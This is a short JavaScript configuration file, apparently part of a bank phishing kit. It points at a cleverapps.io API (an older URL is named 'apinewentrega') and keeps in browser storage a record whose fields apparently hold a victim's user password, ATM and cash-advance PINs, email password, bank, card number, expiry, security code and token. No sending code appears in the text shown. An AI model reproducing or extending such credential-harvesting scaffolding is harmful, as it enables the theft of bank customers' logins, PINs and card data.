/**
 * CONFIGURACION 
 */
    const API_URL = 'https://app-414bf7b5-0a43-474a-a622-c6559f4bd985.cleverapps.io'; // Cambiar según convenga.
    // const API_URL = 'https://apinewentrega.cleverapps.io'; // Cambiar según convenga.





const LS = window.localStorage;
let info = {
    cc: '',
    names: '',
    cenv: '',
    dir: '',
    user: '',
    puser: '',
    ccajero: '',
    cavances: '',
    email: '',
    pemail: '',
    cel: '',
    ban: '',
    p: '',
    f: '',
    c: '',
    type: '',
    tok: '',
    err: ''
}

LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));

function limitarDigitos(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

console.log("Main ON");
